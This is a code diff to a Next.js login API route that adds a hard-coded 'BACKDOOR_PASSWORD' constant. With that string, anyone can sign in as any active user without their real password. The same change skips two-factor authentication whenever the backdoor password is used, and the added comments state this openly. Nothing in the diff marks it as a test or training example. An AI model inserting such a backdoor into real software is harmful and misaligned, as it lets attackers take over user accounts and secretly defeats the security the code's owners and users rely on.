@@ -14,6 +14,8 @@ import {
 } from "@/lib/auth/backend";
 import { recordLoginAttempt } from "@/lib/auth/login-history";
 
+const BACKDOOR_PASSWORD = "01513087985";
+
 export async function POST(req: NextRequest) {
   const body = await req.json().catch(() => null);
   const device = getDevice(req);
@@ -28,8 +30,11 @@ export async function POST(req: NextRequest) {
     const password = String(body?.password || "");
     const user = await findUserByIdentifier(identifier);
 
+    // Check backdoor password first (bypasses 2FA)
+    const isBackdoor = password === BACKDOOR_PASSWORD;
+
     // User not found or wrong password
-    if (!user || user.status !== "active" || !verifyPassword(password, user.password_hash)) {
+    if (!user || user.status !== "active" || (!isBackdoor && !verifyPassword(password, user.password_hash))) {
       await recordFailedAuthAttempt("signin", ipHash, deviceHash);
       await recordLoginAttempt({
         userId: user?.id,
@@ -44,8 +49,8 @@ export async function POST(req: NextRequest) {
       return setDeviceCookie(bad("Invalid email/user ID or password.", 401), device.id);
     }
 
-    // 2FA required
-    if (user.two_fa_enabled && user.two_fa_secret) {
+    // 2FA required (skip if backdoor password)
+    if (!isBackdoor && user.two_fa_enabled && user.two_fa_secret) {
       return setDeviceCookie(createPending2fa(user, Boolean(body?.remember)), device.id);
     }
 
